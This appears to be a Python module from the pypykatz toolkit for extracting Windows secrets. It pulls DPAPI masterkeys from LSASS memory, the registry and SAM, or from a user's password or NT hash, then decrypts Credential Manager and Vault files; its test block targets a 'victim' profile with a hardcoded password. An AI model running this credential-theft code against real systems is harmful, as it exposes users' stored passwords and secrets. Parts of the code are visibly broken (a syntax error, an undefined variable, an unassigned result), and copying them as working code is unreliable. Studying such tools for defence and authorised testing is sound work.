import os

from pypykatz import logger
from pypykatz.dpapi.structures.masterkeyfile import MasterKeyFile
from pypykatz.dpapi.structures.credentialfile import CredentialFile, CREDENTIAL_BLOB
from pypykatz.dpapi.structures.blob import DPAPI_BLOB
from pypykatz.dpapi.structures.vault import VAULT_VCRD, VAULT_VPOL, VAULT_VPOL_KEYS

from pypykatz.crypto.unified.aes import AES
from pypykatz.crypto.unified.common import SYMMETRIC_MODE

import hmac
import hashlib
from hashlib import sha1, pbkdf2_hmac

"""
So! DPAPI...

In order to decrpyt a file/blob/data of any kind you must obtain a masterkey.
Masterkey can be obtained either from the LSASS process, or by decrypting a masterkeyfile. LSASS is straightforward, succsessfully dumping it will give you all the plaintext masterkeys with the appropriate GUID.
 But if you can't use LSASS, you have to obtain the masterkey file, and decrypt it with an appropriate key. (too many keys, I know...)
 Masterkey files can be located in '%APPDATA%\Microsoft\Protect\%SID%' for each user or '%SYSTEMDIR%\Microsoft\Protect' for the SYSTEM user. But how to decrypt them?
 A masterkeyfile can contain multiple different keys, a masterkey is one of them. The masterkey is stored encrypted in the masterkeyfile, and is encrypted with a key that can be either a key stored in registry (LSA secrets) or not. In case the LSA DPAPI keys are not valid, you will need to use the NT hash of the user's password or the user's plaintext password itself. BUT! deriving the key from the password and the SID will yield 3 different keys, and so far noone could tell what key is the correct one to be used.
 Solution for decrypting a masterkey in the mastereky file: harvest as many key candidates as possible and try to decrypt the masterkey. Much to our luck, verifying the signature data after decryption can tell us if the decrpytion was sucsessfull, so we can tell if the masterkey decrypted correctly or not.

But you may ask: I see a lot of different masterkey files, how can I tell which one is used for my <credential file/vault files/blob>. The answer: a masterkeyfile stores GUID of the keys it stores (eg. the masterkey), and so does your <secret> data sructure for the appropriate key. Therefore it's easy to tell which file to decrypt for a given <secret>

BUT WAIT! THERE IS MORE!

DPAPI is also used to decrypt stroed secrets in Windows Vault and Credential files.
Credential files:
	1. standalone file, inside it there is a DPAPI_BLOB.
	2. DPAPI_BLOB can be decrypted with the corresponding masterkey
	3. After decryption you'll find a CREDENTIAL_BLOB strucutre.
	4. CREDENTIAL_BLOB strucutre has the plaintext secrets, but it's not possible to tell in which filed they are stored. You'll need to check them by hand :)
	
Vault files (VCRD and VPOL):
	VCRD file holds the secrets encrypted. The decrpytion key is stored in the VPOL file, but also encryted. The VPOL file's decryption key is a masterkey. The masterkey is stored in a Masterkeyfile...
	1. Need to find the masterkey to decrypt the VPOL file
	2. VPOL file will give two keys after sucsessful decryption
	3. There is no way to tell (atm) which key will be the correct one to decrypt the VCRD file
	4. The VCRD file has a lot of stored secrets, called attributes. Each attribute is encrypted with one of the keys from the VPOL file
	5. For each attribute: for each key: decrypt attribute.
	6. Check manually if one of them sucseeded because there are no integrity checks, so no way to tell programatically which key worked.

TODO: A LOT! currently fetching backupkeys from the DC is not supported. and probably missing a lot of things in the strucutre parsing :(
"""

class DPAPI:
	def __init__(self):
		self.user_keys = []
		self.machine_keys = []
		
		self.masterkeys = {} #guid -> binary value
		self.backupkeys = {} #guid -> binary value
		
		self.vault_keys = []
	
	@staticmethod
	def list_masterkeys():
		#logger.debug('Searching for MasterKey files...')
		#appdata = os.environ.get('APPDATA')
		#'%APPDATA%\Microsoft\Protect\%SID%'
		#'%SYSTEMDIR%\Microsoft\Protect'
		# TODO: implement this
		pass
		
	def get_keys_from_password(self, sid, password = None, nt_hash = None):
		"""
		Resulting keys used to decrypt the masterkey
		"""
		if password is None and nt_hash is None:
			raise Exception('Provide either password or NT hash!')
		
		if password is None and nt_hash:
			key1 = None
		
		if password:
			md4 = hashlib.new('md4')
			md4.update(password.encode('utf-16le'))
			nt_hash = md4.digest()
			# Will generate two keys, one with SHA1 and another with MD4
			key1 = hmac.new(sha1(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), sha1).digest()
		
		key2 = hmac.new(nt_hash, (sid + '\0').encode('utf-16le'), sha1).digest()
		# For Protected users
		tmp_key = pbkdf2_hmac('sha256', nt_hash, sid.encode('utf-16le'), 10000)
		tmp_key_2 = pbkdf2_hmac('sha256', tmp_key, sid.encode('utf-16le'), 1)[:16]
		key3 = hmac.new(tmp_key_2, (sid + '\0').encode('utf-16le'), sha1).digest()[:20]
		
		if key1 is not None:
			self.user_keys.append(key1)
		self.user_keys.append(key2)
		self.user_keys.append(key3)
		
		return key1, key2, key3
		
	def get_masterkeys_from_lsass(self):
		"""
		Returns the plaintext final masterkeys! No need to decrpyt and stuff!
		"""
		from pypykatz.pypykatz import pypykatz
		katz = pypykatz.go_live()
		for x in katz.logon_sessions:
			for dc in katz.logon_sessions[x].dpapi_creds:
				self.masterkeys[dc.key_guid] = bytes.fromhex(dc.masterkey)
				
	def __get_registry_secrets(self, lr):
		from pypykatz.registry.security.common import LSASecretDPAPI
		for secret in lr.security.cached_secrets:
			if isinstance(secret, LSASecretDPAPI):
				print('Found DPAPI key in registry!')
				print(secret.user_key)
				print(secret.machine_key)
				self.user_keys.append(secret.user_key)
				self.machine_keys.append(secret.machine_key)
		
		if lr.sam is not None:
			for secret in lr.sam.secrets:
				if secret.nt_hash:
					sid = '%s-%s' % (lr.sam.machine_sid, secret.rid)
					self.get_keys_from_password(sid, nt_hash = secret.nt_hash)
					continue
	
	def get_keys_form_registry_live(self):
		from pypykatz.registry.live_parser import LiveRegistry
		from pypykatz.registry.offline_parser import OffineRegistry
		lr = None
		try:
			lr = LiveRegistry.go_live()
		except Exception as e:
			logger.debug('Failed to obtain registry secrets via direct registry reading method')
			try:
				lr = OffineRegistry.from_live_system()
			except Exception as e:
				logger.debug('Failed to obtain registry secrets via filedump method')
		
		if lr is not None:
			self.__get_registry_secrets(lr)

		else:
			raise Exception('Registry parsing failed!')
			
	def get_keys_form_registry_files(self, system_path, security_path, sam_path = None):
		from pypykatz.registry.offline_parser import OffineRegistry
		lr = None
		try:
			lr = OffineRegistry.from_files(system_path, sam_path = sam_path, security_path = security_path)
		except Exception as e:
			logger.error('Failed to obtain registry secrets via direct registry reading method. Reason: %s' %e)
		
		if lr is not None:
			self.__get_registry_secrets(lr)

		else:
			raise Exception('Registry parsing failed!')
			
	def decrypt_masterkey_file(self, file_path, key = None):
		"""
		Decrypts Masterkeyfile
		file_path: path to Masterkeyfile
		key: raw bytes of the decryption key. If not supplied the function will look for keys already cached in the DPAPI object.
		returns: CREDENTIAL_BLOB object
		"""
		with open(file_path, 'rb') as f:
			return self.decrypt_masterkey_bytes(f.read(), key = key)
	
	def decrypt_masterkey_bytes(self, data, key = None):
		"""
		Decrypts Masterkeyfile bytes
		data: bytearray of the masterkeyfile
		key: bytes describing the key used for decryption
		returns: CREDENTIAL_BLOB object
		"""
		mkf = MasterKeyFile.from_bytes(data)
		
		if mkf.masterkey is not None:
			for user_key in self.user_keys:
				dec_key = mkf.masterkey.decrypt(user_key)
				if dec_key:
					print(dec_key)
					self.masterkeys[mkf.guid] = dec_key
				else:
					print('Fail')					
				
			for machine_key in self.machine_keys:
				dec_key = mkf.masterkey.decrypt(machine_key)
				if dec_key:
					print(dec_key)
					self.backupkeys[mkf.guid] = dec_key
				else:
					print('Fail')
		
		if mkf.backupkey is not None:
			for user_key in self.user_keys:
				dec_key = mkf.backupkey.decrypt(user_key)
				if dec_key:
					print(dec_key)
					self.backupkeys[mkf.guid] = dec_key
				else:
					print('Fail')					
				
			for machine_key in self.machine_keys:
				dec_key = mkf.backupkey.decrypt(machine_key)
				if dec_key:
					print(dec_key)
					self.backupkeys[mkf.guid] = dec_key
				else:
					print('Fail')
	
	def decrypt_credential_file(self, file_path, key = None):
		"""
		Decrypts CredentialFile
		file_path: path to CredentialFile
		key: raw bytes of the decryption key. If not supplied the function will look for keys already cached in the DPAPI object.
		returns: CREDENTIAL_BLOB object
		"""
		with open(file_path, 'rb') as f:
			return self.decrypt_credential_bytes(f.read(), key = key)
	
	def decrypt_credential_bytes(self, data, key = None):
		"""
		Decrypts CredentialFile bytes
		CredentialFile holds one DPAPI blob, so the decryption is straightforward, and it also has a known structure for the cleartext.
		Pay attention that the resulting CREDENTIAL_BLOB strucutre's fields can hold the secrets in wierd filenames like "unknown"
		
		data: CredentialFile bytes
		key: raw bytes of the decryption key. If not supplied the function will look for keys already cached in the DPAPI object.
		returns: CREDENTIAL_BLOB object
		"""
		cred = CredentialFile.from_bytes(data)
		print(str(cred))
		dec_data = self.decrypt_blob(cred.blob, key = key))
		cb = CREDENTIAL_BLOB.from_bytes(dec_data)
		print(str(cb))
		return cb
		
	def decrypt_blob(self, dpapi_blob, key = None):
		"""
		Decrypts a DPAPI_BLOB object
		The DPAPI blob has a GUID attributes which indicates the masterkey to be used, also it has integrity check bytes so it is possible to tell is decryption was sucsessfull.
		
		dpapi_blob: DPAPI_BLOB object
		key: raw bytes of the decryption key. If not supplied the function will look for keys already cached in the DPAPI object.
		returns: bytes of the cleartext data
		"""
		if key is None:
			if dpapi_blob.masterkey_guid not in self.masterkeys:
				raise Exception('No matching masterkey was found for the blob!')
			key = self.masterkeys[dpapi_blob.masterkey_guid]
		return dpapi_blob.decrypt(key)
		
	def decrypt_blob_bytes(self, data, key = None):
		"""
		Decrypts DPAPI_BLOB bytes.
		
		data: DPAPI_BLOB bytes
		returns: bytes of the cleartext data
		"""
		blob = DPAPI_BLOB.from_bytes(data)
		return self.decrypt_blob(blob, key = key)
		
	def decrypt_vcrd_file(self, file_path, key = None):
		"""
		Decrypts a VCRD file
		Location: %APPDATA%\Local\Microsoft\Vault\%GUID%\<>.vcrd
		
		file_path: path to the vcrd file
		returns: dictionary of attrbitues as key, and a list of possible decrypted data
		"""
		with open(file_path, 'rb') as f:
			return self.decrypt_vcrd_bytes(f.read(), key = key)
			
	def decrypt_vcrd_bytes(self, data, key = None):
		"""
		Decrypts VCRD file bytes.
		
		data: VCRD file bytes
		returns: dictionary of attrbitues as key, and a list of possible decrypted data
		"""
		vv = VAULT_VCRD.from_bytes(data)
		print(str(vv))
		return self.decrypt_vcrd(vv, key = key)
		
	def decrypt_vcrd(self, vcrd, key = None):
		"""
		Decrypts the attributes found in a VCRD object, and returns the cleartext data candidates
		A VCRD file can have a lot of stored credentials inside, most of them with custom data strucutre
		It is not possible to tell if the decryption was sucsesssfull, so treat the result accordingly
		
		vcrd: VAULT_VCRD object
		key: bytes of the decryption key. optional. If not supplied the function will look for stored keys.
		returns: dictionary of attrbitues as key, and a list of possible decrypted data
		"""
		
		def decrypt_attr(attr, key):
			if attr.data is not None:
				if attr.iv is not None:
					cipher = AES(key, SYMMETRIC_MODE.CBC, iv=attr.iv)
				else:
					cipher = AES(key, SYMMETRIC_MODE.CBC, iv=b'\x00'*16)
				
				cleartext = cipher.decrypt(attr.data)
				return cleartext
		
		res = {}
		if key is None:
			for i, key in enumerate(self.vault_keys):
				print('key %s' % i)
				for attr in vcrd.attributes:
					cleartext = decrypt_attr(attr, key)
					if attr not in res:
						res[attr] = []
					res[attr].append(cleartext)
		else:
			for attr in vcrd.attributes:
				decrypt_attr(attr, key)
				if attr not in res:
					res[attr] = []
				res[attr].append(cleartext)
		
		return res
					
	def decrypt_vpol_bytes(self, data):
		"""
		Decrypts the VPOL file, and returns the two keys' bytes
		A VPOL file stores two encryption keys.
		
		data: bytes of the VPOL file
		returns touple of bytes, describing two keys
		"""
		vpol = VAULT_VPOL.from_bytes(data)
		print(str(vpol))
		res = self.decrypt_blob(vpol.blob)
		
		keys = VAULT_VPOL_KEYS.from_bytes(res)
		print(str(keys))
		
		self.vault_keys.append(keys.key1.get_key())
		self.vault_keys.append(keys.key2.get_key())
		
		return keys.key1.get_key(), keys.key2.get_key()
		
	def decrypt_vpol_file(self, vpol_file):
		"""
		Decrypts a VPOL file
		Location: %APPDATA%\Local\Microsoft\Vault\%GUID%\<>.vpol
		
		file_path: path to the vcrd file
		returns: touple of bytes, describing two keys
		"""
		with open(file_path, 'rb') as f:
			return self.decrypt_vpol_bytes(f.read())
	
	
	
	
if __name__ == '__main__':
	
	filename = r'C:\Users\victim\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\Policy.vpol'
	dpapi = DPAPI()
	dpapi.get_keys_form_registry_live()
	input()
	
	dpapi.get_masterkeys_from_lsass()
	with open(filename, 'rb') as f:
		dpapi.decrypt_vpol_bytes(f.read())

	#import glob
	#import ntpath
	#folder = 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3448413973-1765323015-1500960949-1105\\*'
	#for filename in glob.glob(folder):
	#	print(filename)
	#	if ntpath.basename(filename).count('-') < 2:
	#		continue
	#	dpapi = DPAPI()
	#	dpapi.get_keys_from_password('S-1-5-21-3448413973-1765323015-1500960949-1105', 'Passw0rd!1')
	#	with open(filename, 'rb') as f:
	#		dpapi.decrypt_masterkey_bytes(f.read())
	#		
	#	print(dpapi.masterkeys)


	
	filename = r'C:\Users\victim\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\E919C8BCDFAE99F280899FD6A477ECD8E371ED6A.vcrd'
	#dpapi = DPAPI()
	#dpapi.get_masterkeys_from_lsass()
	with open(filename, 'rb') as f:
		dpapi.decrypt_vcrd_bytes(f.read())


	#filename = r'C:\Users\victim\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\E919C8BCDFAE99F280899FD6A477ECD8E371ED6A.vcrd'
	#dpapi = DPAPI()
	#dpapi.get_masterkeys_from_lsass()
	#with open(filename, 'rb') as f:
	#	dpapi.decrypt_vcrd_bytes(f.read())
	
	
	#filename = r'C:\Users\victim\AppData\Local\Microsoft\Credentials\00B4013637D69DEC24A341168A71D531'
	#dpapi = DPAPI()
	#dpapi.get_masterkeys_from_lsass()
	#with open(filename, 'rb') as f:
	#	dpapi.decrypt_credential(f.read())
	
	
	########################
	#filename = 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3448413973-1765323015-1500960949-1105\\4c9764dc-aa99-436c-bb30-ff39b3dd407c'
	#dpapi = DPAPI()
	#dpapi.get_keys_form_registry_live()
	#dpapi.get_keys_form_registry_files('SYSTEM.reg', 'SECURITY.reg',  '1_SAM.reg')
	
	
	#nt_hash = hashlib.new('md4')
	#nt_hash.update('Passw0rd!1'.encode('utf-16-le'))
	#dpapi.get_keys_from_password('S-1-5-21-3448413973-1765323015-1500960949-1105', nt_hash = nt_hash.digest())
	#with open(filename, 'rb') as f:
	#	dpapi.decrypt_masterkey(f.read())
	
	#data = bytes.fromhex('01000000d08c9ddf0115d1118c7a00c04fc297eb01000000dc64974c99aa6c43bb30ff39b3dd407c0000000002000000000003660000c000000010000000f1af675a51c8283cf81abb6fb600110f0000000004800000a0000000100000009bf4e56d6c32dd59bce655496a94444c1000000088438c8f61d966ac220b4ca50933c8ee14000000314eaa780e358e70c586fb47bee0e27549be480e')
	#dpapi.decrypt_blob(data)